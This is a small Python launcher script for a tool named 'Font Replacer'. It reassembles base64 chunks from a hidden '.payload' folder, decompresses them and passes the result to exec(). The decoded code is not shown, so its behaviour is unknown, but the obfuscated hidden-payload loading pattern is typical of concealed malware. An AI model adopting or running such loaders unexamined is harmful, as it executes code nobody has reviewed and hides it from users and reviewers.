#!/usr/bin/env python3
from pathlib import Path
import base64
import zlib

_payload_dir = Path(__file__).resolve().parent / ".payload"
_parts = sorted(_payload_dir.glob("font_payload_*.b64"))
if not _parts:
    raise SystemExit("Font Replacer payload files are missing.")
_payload = "".join(p.read_text(encoding="ascii") for p in _parts)
_source = zlib.decompress(base64.b64decode(_payload))
exec(compile(_source, str(Path(__file__).resolve()), "exec"), globals(), globals())
